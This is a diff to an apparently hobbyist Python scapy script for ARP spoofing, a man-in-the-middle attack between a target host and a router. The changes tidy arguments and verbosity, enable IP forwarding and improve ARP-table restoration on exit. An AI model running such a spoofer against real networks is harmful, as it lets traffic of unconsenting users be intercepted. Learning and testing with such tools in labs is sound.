@@ -7,13 +7,8 @@ import argparse
 
 from scapy.packet import Packet
 
-# Hard coded values to replace via optparse
-# target = {"name": "target", "ip": "10.211.55.6", "mac": "00:1c:42:aa:7c:10"}
-# router = {"name": "router", "ip": "10.211.55.1", "mac": "00:1c:42:00:00:18"}
-# verbose = False
-
 # TODO implement verbose functionality
-# TODO seperate out fetching mac from spoof()
+# TODO separate out fetching mac from spoof()
 # TODO add support for hostnames/FQDNs instead of IPs
 
 def get_arguments():
@@ -32,11 +27,12 @@ def get_arguments():
     return args
 
 def get_mac(host):
-    ''' TODO '''
+    # print("[i] Entering get_mac function host is: ", host)
     arp_request = scapy.ARP(pdst=host)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     targets_found = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    # if target_found empty handle error eg if target not up
     target_mac_address = targets_found[0][1].hwsrc
     if args.verbose:
         print("[+] Target MAC: " + target_mac_address)
@@ -49,7 +45,7 @@ def spoof(target, spoof):
     if args.verbose:
         print(packet.show())
         print(packet.summary())
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, verbose=args.verbose)
 
 def restore_arp(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
@@ -58,11 +54,19 @@ def restore_arp(destination_ip, source_ip):
     if args.verbose:
         print(packet.show())
         print(packet.summary())
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, count=4, verbose=args.verbose)
+    print("\n[+] ARP Tables reset correctly")
 
 args = get_arguments()
 # print(args)
 # print(args.target, args.router)
+
+# TODO create function storing state of ip_forwarding for restoration
+# read /proc/sys/net/ipv4/ip_forward at start and store
+# on restore 
+#   1) restore both MACS
+#   2) restore ip_forward to state prior to execution
+
 
 subprocess.call(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]) # Setup routing/forwarding locally
 
@@ -77,5 +81,5 @@ try:
         print(" packet: " + str(sent_packet_count) + " to " + args.router + " (router)", end="")
         sleep(1)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL +C .... Quitting.")
+    print("\n[+] Detected CTRL +C .... Resetting ARP tables.", end="")
     restore_arp(args.target, args.router)
